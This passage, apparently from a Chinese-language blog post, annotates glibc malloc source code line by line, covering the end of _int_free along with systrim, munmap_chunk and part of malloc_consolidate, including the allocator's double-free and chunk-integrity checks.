TRIM_FASTBINS 默认为 0，即 top_chunk 不会合并与它相邻的 fastbin 块</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> TRIM_FASTBINS</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">      If TRIM_FASTBINS set, don&#x27;t place chunks</span><br><span class="hljs-comment">      bordering top into fastbins</span><br><span class="hljs-comment">        */</span><br>        &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>            ) &#123;<br>        <span class="hljs-comment">// 检查下一个 chunk 的大小，不能小于 2 * SIZE_SZ ，也不能大于 av-&gt;system_mem,</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask (chunk_at_offset(p, size))<br>                             &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>            || __builtin_expect(chunksize (chunk_at_offset(p, size))<br>                                &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-type">bool</span> fail = <span class="hljs-literal">true</span>;<br>            <span class="hljs-comment">/* We might not have a lock at this point and concurrent modifications</span><br><span class="hljs-comment">               of system_mem might result in a false positive.  Redo the test after</span><br><span class="hljs-comment">               getting the lock.  */</span><br>            <span class="hljs-keyword">if</span> (!have_lock) &#123;<br>                __libc_lock_lock(av-&gt;mutex);<br>                fail = (chunksize_nomask (chunk_at_offset(p, size)) &lt;= <span class="hljs-number">2</span> * SIZE_SZ<br>                        || chunksize (chunk_at_offset(p, size)) &gt;= av-&gt;system_mem);<br>                __libc_lock_unlock(av-&gt;mutex);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (fail)<br>                malloc_printerr(<span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// 释放之前将 chunk 填为 perturb_byte</span><br>        free_perturb(chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br>        <span class="hljs-comment">// 设立 have_fastchunks 标志位，表明 fastbin 中有值</span><br>        atomic_store_relaxed(&amp;av-&gt;have_fastchunks, <span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 拿到对应的 fastbin 索引</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx = fastbin_index(size);<br>        <span class="hljs-comment">// 拿到第一个元素</span><br>        fb = &amp;fastbin (av, idx);<br><br>        <span class="hljs-comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span><br>        mchunkptr old = *fb, old2;<br><br>        <span class="hljs-keyword">if</span> (SINGLE_THREAD_P) &#123;<br>            <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to</span><br><span class="hljs-comment">               add (i.e., double free).  */</span><br>            <span class="hljs-comment">// double free</span><br>            <span class="hljs-keyword">if</span> (__builtin_expect(old == p, <span class="hljs-number">0</span>))<br>                malloc_printerr(<span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>);<br>            <span class="hljs-comment">// 将新释放的 chunk 插入链中</span><br>            p-&gt;fd = old;<br>            *fb = p;<br>        &#125; <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">do</span> &#123;<br>                <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to</span><br><span class="hljs-comment">                   add (i.e., double free).  */</span><br>                <span class="hljs-keyword">if</span> (__builtin_expect(old == p, <span class="hljs-number">0</span>))<br>                    malloc_printerr(<span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>);<br>                p-&gt;fd = old2 = old;<br>            &#125; <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2))<br>                     != old2);<br><br>        <span class="hljs-comment">/* Check that size of fastbin chunk at the top is the same as</span><br><span class="hljs-comment">           size of the chunk that we are adding.  We can dereference OLD</span><br><span class="hljs-comment">           only if we have the lock, otherwise it might have already been</span><br><span class="hljs-comment">           allocated again.  */</span><br>        <span class="hljs-comment">// 检查 该 chunk 是否放对了地方</span><br>        <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span><br>            &amp;&amp; __builtin_expect(fastbin_index (chunksize(old)) != idx, <span class="hljs-number">0</span>))<br>            malloc_printerr(<span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>);<br>    &#125;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          Consolidate other non-mmapped chunks as they arrive.</span><br><span class="hljs-comment">        */</span><br>    <span class="hljs-comment">// size 不在 fastbin 内</span><br>    <span class="hljs-comment">// chunk 不是 mmap 分配的</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!chunk_is_mmapped(p)) &#123;<br><br>        <span class="hljs-comment">/* If we&#x27;re single-threaded, don&#x27;t lock the arena.  */</span><br>        <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>            have_lock = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-keyword">if</span> (!have_lock)<br>            __libc_lock_lock(av-&gt;mutex);<br><br>        <span class="hljs-comment">// 拿到下一个 chunk</span><br>        nextchunk = chunk_at_offset(p, size);<br><br>        <span class="hljs-comment">/* Lightweight tests: check whether the block is already the</span><br><span class="hljs-comment">           top block.  */</span><br>        <span class="hljs-comment">// 如果释放的 chunk 是 top_chunk</span><br>        <span class="hljs-keyword">if</span> (__glibc_unlikely(p == av-&gt;top))<br>            malloc_printerr(<span class="hljs-string">&quot;double free or corruption (top)&quot;</span>);<br>        <span class="hljs-comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span><br>        <span class="hljs-comment">// 下一个块超出了 arena 的边界</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect(contiguous (av)<br>                             &amp;&amp; (<span class="hljs-type">char</span> *) nextchunk<br>                                &gt;= ((<span class="hljs-type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="hljs-number">0</span>))<br>            malloc_printerr(<span class="hljs-string">&quot;double free or corruption (out)&quot;</span>);<br>        <span class="hljs-comment">/* Or whether the block is actually not marked used.  */</span><br>        <span class="hljs-comment">// 下一个 chunk 的 prev_inuse 标志位为 0，即前一个 chunk 已经被释放过了</span><br>        <span class="hljs-keyword">if</span> (__glibc_unlikely(!prev_inuse(nextchunk)))<br>            malloc_printerr(<span class="hljs-string">&quot;double free or corruption (!prev)&quot;</span>);<br><br>        <span class="hljs-comment">// 拿到下一个 chunk 的 size</span><br>        nextsize = chunksize(nextchunk);<br>        <span class="hljs-comment">// 如果 下一个 chunk 的 size 小于  2 * SIZE_SZ 或 大于 av-&gt;system_mem</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask (nextchunk) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>            || __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr(<span class="hljs-string">&quot;free(): invalid next size (normal)&quot;</span>);<br>        <span class="hljs-comment">// 将该 chunk 的 data 部分填充为 perturb_byte</span><br>        free_perturb(chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br><br>        <span class="hljs-comment">/* consolidate backward */</span><br>        <span class="hljs-comment">// 如果释放块之前的块也是 free 的</span><br>        <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>            <span class="hljs-comment">// 拿到上一个 chunk 的 size</span><br>            prevsize = prev_size (p);<br>            size += prevsize;<br>            <span class="hljs-comment">// 拿到前一个 chunk</span><br>            p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>            <span class="hljs-comment">// 将前一个 chunk 取消链接</span><br>            unlink(av, p, bck, fwd);<br>        &#125;<br>        <span class="hljs-comment">// 如果下一个 chunk 不为 top_chunk</span><br>        <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>            <span class="hljs-comment">/* get and clear inuse bit */</span><br>            <span class="hljs-comment">// 查看下一个 chunk 是否为 释放状态</span><br>            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>            <span class="hljs-comment">/* consolidate forward */</span><br>            <span class="hljs-comment">// 如果下一个 chunk 也是释放状态</span><br>            <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>                <span class="hljs-comment">// 将下一个 chunk 取消链接</span><br>                unlink(av, nextchunk, bck, fwd);<br>                size += nextsize;<br>            &#125;<br>            <span class="hljs-comment">// 如果下一个 chunk 仍处于使用状态</span><br>            <span class="hljs-keyword">else</span><br>                <span class="hljs-comment">// 清除下一个 chunk 的 prev_inuse 位</span><br>                clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">          Place the chunk in unsorted chunk list. Chunks are</span><br><span class="hljs-comment">          not placed into regular bins until after they have</span><br><span class="hljs-comment">          been given one chance to be used in malloc.</span><br><span class="hljs-comment">            */</span><br>            <span class="hljs-comment">// 拿到 unsorter_bin</span><br>            bck = unsorted_chunks(av);<br>            <span class="hljs-comment">// 拿到链上的第一个 chunk</span><br>            fwd = bck-&gt;fd;<br>            <span class="hljs-comment">// 检查双向链接完整性</span><br>            <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))<br>                malloc_printerr(<span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>);<br>            <span class="hljs-comment">// 将释放的 chunk 加入链中</span><br>            p-&gt;fd = fwd;<br>            p-&gt;bk = bck;<br>            <span class="hljs-comment">// 如果 size 在 lage_bin 的范围之中</span><br>            <span class="hljs-comment">// 清除 nextsize 域</span><br>            <span class="hljs-keyword">if</span> (!in_smallbin_range(size)) &#123;<br>                p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>            &#125;<br>            <span class="hljs-comment">// 完成链接</span><br>            bck-&gt;fd = p;<br>            fwd-&gt;bk = p;<br>            <span class="hljs-comment">// 设立 标志位</span><br>            set_head(p, size | PREV_INUSE);<br>            set_foot(p, size);<br><br>            <span class="hljs-comment">// 啥也没干</span><br>            check_free_chunk(av, p);<br>        &#125;<br><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">              If the chunk borders the current high end of memory,</span><br><span class="hljs-comment">              consolidate into top</span><br><span class="hljs-comment">            */</span><br>        <span class="hljs-comment">// 与 top_chunk 进行合并</span><br>        <span class="hljs-keyword">else</span> &#123;<br>            size += nextsize;<br>            set_head(p, size | PREV_INUSE);<br>            av-&gt;top = p;<br>            check_chunk(av, p);<br>        &#125;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          If freeing a large space, consolidate possibly-surrounding</span><br><span class="hljs-comment">          chunks. Then, if the total unused topmost memory exceeds trim</span><br><span class="hljs-comment">          threshold, ask malloc_trim to reduce top.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          Unless max_fast is 0, we don&#x27;t know if there are fastbins</span><br><span class="hljs-comment">          bordering top, so we cannot tell for sure whether threshold</span><br><span class="hljs-comment">          has been reached unless fastbins are consolidated.  But we</span><br><span class="hljs-comment">          don&#x27;t want to consolidate on each free.  As a compromise,</span><br><span class="hljs-comment">          consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span><br><span class="hljs-comment">          is reached.</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-comment">// 如果 size 大于 FASTBIN_CONSOLIDATION_THRESHOLD</span><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;<br>            <span class="hljs-comment">// 如果 fastbin 中有空闲的 chunk</span><br>            <span class="hljs-keyword">if</span> (atomic_load_relaxed(&amp;av-&gt;have_fastchunks))<br>                <span class="hljs-comment">// 触发 malloc_consolidate</span><br>                malloc_consolidate(av);<br>            <span class="hljs-comment">// 如果此时的 arena 为 main_arena</span><br>            <span class="hljs-keyword">if</span> (av == &amp;main_arena) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span><br>                <span class="hljs-comment">// 如果 top_chunk 的 size 大于 heap的收缩阈值</span><br>                <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (chunksize(av-&gt;top)) &gt;=<br>                    (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (mp_.trim_threshold))<br>                    systrim(mp_.top_pad, av);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">/* Always try heap_trim(), even if the top chunk is not</span><br><span class="hljs-comment">                   large, because the corresponding heap might go away.  */</span><br>                <span class="hljs-comment">// 收缩非主分配区</span><br>                heap_info *heap = heap_for_ptr(top(av));<br><br>                assert(heap-&gt;ar_ptr == av);<br>                heap_trim(heap, mp_.top_pad);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!have_lock)<br>            __libc_lock_unlock(av-&gt;mutex);<br>    &#125;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          If the chunk was allocated via mmap, release via munmap().</span><br><span class="hljs-comment">        */</span><br>    <span class="hljs-comment">// 该 chunk 是 mmap 分配的</span><br>    <span class="hljs-keyword">else</span> &#123;<br>        munmap_chunk(p);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="systrim"><a href="#systrim" class="headerlink" title="systrim"></a>systrim</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   systrim is an inverse of sorts to sysmalloc.  It gives memory back</span><br><span class="hljs-comment">   to the system (via negative arguments to sbrk) if there is unused</span><br><span class="hljs-comment">   memory at the `high&#x27; end of the malloc pool. It is called</span><br><span class="hljs-comment">   automatically by free() when top space exceeds the trim</span><br><span class="hljs-comment">   threshold. It is also called by the public malloc_trim routine.  It</span><br><span class="hljs-comment">   returns 1 if it actually released any memory, else 0.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">systrim</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pad, mstate av)</span> &#123;<br>    <span class="hljs-type">long</span> top_size;         <span class="hljs-comment">/* Amount of top-most memory */</span><br>    <span class="hljs-type">long</span> extra;            <span class="hljs-comment">/* Amount to release */</span><br>    <span class="hljs-type">long</span> released;         <span class="hljs-comment">/* Amount actually released */</span><br>    <span class="hljs-type">char</span> *current_brk;     <span class="hljs-comment">/* address returned by pre-check sbrk call */</span><br>    <span class="hljs-type">char</span> *new_brk;         <span class="hljs-comment">/* address returned by post-check sbrk call */</span><br>    <span class="hljs-type">size_t</span> pagesize;<br>    <span class="hljs-type">long</span> top_area;<br><br>    pagesize = GLRO(dl_pagesize);<br>    top_size = chunksize (av-&gt;top);<br><br>    top_area = top_size - MINSIZE <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">if</span> (top_area &lt;= pad)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* Release in pagesize units and round down to the nearest page.  */</span><br>    extra = ALIGN_DOWN(top_area - pad, pagesize);<br><br>    <span class="hljs-keyword">if</span> (extra == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">       Only proceed if end of memory is where we last set it.</span><br><span class="hljs-comment">       This avoids problems if there were foreign sbrk calls.</span><br><span class="hljs-comment">     */</span><br>    current_brk = (<span class="hljs-type">char</span> *) (MORECORE(<span class="hljs-number">0</span>));<br>    <span class="hljs-keyword">if</span> (current_brk == (<span class="hljs-type">char</span> *) (av-&gt;top) + top_size) &#123;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">           Attempt to release memory. We ignore MORECORE return value,</span><br><span class="hljs-comment">           and instead call again to find out where new end of memory is.</span><br><span class="hljs-comment">           This avoids problems if first call releases less than we asked,</span><br><span class="hljs-comment">           of if failure somehow altered brk value. (We could still</span><br><span class="hljs-comment">           encounter problems if it altered brk in some very bad way,</span><br><span class="hljs-comment">           but the only thing we can do is adjust anyway, which will cause</span><br><span class="hljs-comment">           some downstream failure.)</span><br><span class="hljs-comment">         */</span><br><br>        MORECORE(-extra);<br>        <span class="hljs-comment">/* Call the `morecore&#x27; hook if necessary.  */</span><br>        <span class="hljs-type">void</span> (*hook)(<span class="hljs-type">void</span>) = atomic_forced_read(__after_morecore_hook);<br>        <span class="hljs-keyword">if</span> (__builtin_expect(hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>            (*hook)();<br>        new_brk = (<span class="hljs-type">char</span> *) (MORECORE(<span class="hljs-number">0</span>));<br><br>        LIBC_PROBE(memory_sbrk_less, <span class="hljs-number">2</span>, new_brk, extra);<br><br>        <span class="hljs-keyword">if</span> (new_brk != (<span class="hljs-type">char</span> *) MORECORE_FAILURE) &#123;<br>            released = (<span class="hljs-type">long</span>) (current_brk - new_brk);<br><br>            <span class="hljs-keyword">if</span> (released != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">/* Success. Adjust top. */</span><br>                av-&gt;system_mem -= released;<br>                set_head (av-&gt;top, (top_size - released) | PREV_INUSE);<br>                check_malloc_state (av);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="munmap-chunk"><a href="#munmap-chunk" class="headerlink" title="munmap_chunk"></a>munmap_chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">munmap_chunk</span><span class="hljs-params">(mchunkptr p)</span> &#123;<br>    INTERNAL_SIZE_T size = chunksize (p);<br><br>    assert(chunk_is_mmapped (p));<br><br>    <span class="hljs-comment">/* Do nothing if the chunk is a faked mmapped chunk in the dumped</span><br><span class="hljs-comment">       main arena.  We never free this memory.  */</span><br>    <span class="hljs-keyword">if</span> (DUMPED_MAIN_ARENA_CHUNK (p))<br>        <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-type">uintptr_t</span> block = (<span class="hljs-type">uintptr_t</span>) p - prev_size (p);<br>    <span class="hljs-type">size_t</span> total_size = prev_size (p) + size;<br>    <span class="hljs-comment">/* Unfortunately we have to do the compilers job by hand here.  Normally</span><br><span class="hljs-comment">       we would test BLOCK and TOTAL-SIZE separately for compliance with the</span><br><span class="hljs-comment">       page size.  But gcc does not recognize the optimization possibility</span><br><span class="hljs-comment">       (in the moment at least) so we combine the two values into one before</span><br><span class="hljs-comment">       the bit test.  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect(((block | total_size) &amp; (GLRO(dl_pagesize) - <span class="hljs-number">1</span>)) != <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>        malloc_printerr(<span class="hljs-string">&quot;munmap_chunk(): invalid pointer&quot;</span>);<br><br>    atomic_decrement(&amp;mp_.n_mmaps);<br>    <span class="hljs-type">atomic_add</span>(&amp;mp_.mmapped_mem, -total_size);<br><br>    <span class="hljs-comment">/* If munmap failed the process virtual memory address space is in a</span><br><span class="hljs-comment">       bad shape.  Just leave the block hanging around, the process will</span><br><span class="hljs-comment">       terminate shortly anyway since not much can be done.  */</span><br>    __munmap((<span class="hljs-type">char</span> *) block, total_size);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  ------------------------- malloc_consolidate -------------------------</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  malloc_consolidate is a specialized version of free() that tears</span><br><span class="hljs-comment">  down chunks held in fastbins.  Free itself cannot be used for this</span><br><span class="hljs-comment">  purpose since, among other things, it might place chunks back onto</span><br><span class="hljs-comment">  fastbins.  So, instead, we need to use a minor variant of the same</span><br><span class="hljs-comment">  code.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">malloc_consolidate</span><span class="hljs-params">(mstate av)</span> &#123;<br>    mfastbinptr *fb;                 <span class="hljs-comment">/* current fastbin being consolidated */</span><br>    mfastbinptr *maxfb;              <span class="hljs-comment">/* last fastbin (for loop control) */</span><br>    mchunkptr p;                  <span class="hljs-comment">/* current chunk being consolidated */</span><br>    mchunkptr nextp;              <span class="hljs-comment">/* next chunk to consolidate */</span><br>    mchunkptr unsorted_bin;       <span class="hljs-comment">/* bin header */</span><br>    mchunkptr first_unsorted;     <span class="hljs-comment">/* chunk to link to */</span><br><br>    <span class="hljs-comment">/* These have same use as in free() */</span><br>    mchunkptr nextchunk;<br>    INTERNAL_SIZE_T size;<br>    INTERNAL_SIZE_T nextsize;<br>    INTERNAL_SIZE_T prevsize;<br>    <span class="hljs-type">int</span> nextinuse;<br>    mchunkptr bck;<br>    mchunkptr fwd;<br><br>    <span class="hljs-comment">// 清除 have_fastchunks 标志位</span><br>    atomic_store_relaxed(&amp;av-&gt;have_fastchunks, <span class="hljs-literal">false</span>);<br>    <span class="hljs-comment">// 拿到 unsorted_bin</span><br>    unsorted_bin = unsorted_chunks(av);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      Remove each chunk from fast bin and consolidate it, placing it</span><br><span class="hljs-comment">      then in unsorted bin. Among other reasons for doing this,</span><br><span class="hljs-comment">      placing in unsorted bin avoids needing to calculate actual bins</span><br><span class="hljs-comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span><br><span class="hljs-comment">      reused anyway.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">// 拿到最大的 fastbin entry 地址</span><br>    maxfb = &amp;fastbin (av, NFASTBINS - <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// 拿到最小的 fastbin entry 地址</span><br>    fb = &amp;fastbin (av, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-comment">// 替换 p 的值为 fb</span><br>        p = atomic_exchange_acq(fb, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-comment">// 如果 p 不为 null</span><br>        <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">do</span> &#123;<br>                &#123;<br>                    <span class="hljs-comment">// 根据 size 拿到对应的 fastbin 索引</span><br>                    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx = fastbin_index (chunksize(p));<br>                    <span class="hljs-comment">// 如果不匹配</span><br>                    <span class="hljs-keyword">if</span> ((&amp;fastbin (av, idx)) != fb)<br>                        malloc_printerr(<span class="hljs-string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);<br>                &#125;<br>                <span class="hljs-comment">// 啥也没干</span><br>                check_inuse_chunk(av, p);<br>                <span class="hljs-comment">// 拿到下一个元素</span><br>                nextp = p-&gt;fd;<br><br>                <span class="hljs-comment">/* Slightly streamlined version of consolidation code in free() */</span><br>                <span class="hljs-comment">// 拿到size</span><br>                size = chunksize (p);<br>                <span class="hljs-comment">// 拿到下一个 chunk （物理意义）</span><br>                nextchunk = chunk_at_offset(p, size);<br>                <span class="hljs-comment">// 拿到下一个 chunk （物理意义）的 size</span><br>                nextsize = chunksize(nextchunk);<br>                <span class="hljs-comment">// 如果前一个 chunk 为释放状态</span><br>                <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>                    prevsize = prev_size (p);<br>                    size += prevsize;<br>                    p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>                    unlink(av, p, bck, fwd);<br>                &#125;<br>                <span class="hljs-comment">// 如果下一个 不是 top_chunk</span><br>                <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>                    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>                    <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>                        size += nextsize;<br>                        unlink(av, nextchunk, bck, fwd);<br>                    &#125; <span class="hljs-keyword">else</span><br>                        clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br>                    <span class="hljs-comment">// 拿到 unsorted_bin 的第一个元素</span><br>                    first_unsorted = unsorted_bin-&gt;fd;<br>                    <span class="hljs-comment">// 进行链接</span><br>                    unsorted_bin-&gt;fd = p;<br>                    first_unsorted-&gt;bk = p;<br><br>                    <span class="hljs-keyword">if</span> (!in_smallbin_range (size)) &#123;<br>                        p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                        p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                    &#125;<br><br>                    set_head(p, size | PREV_INUSE);<br>                    p-&gt;bk = 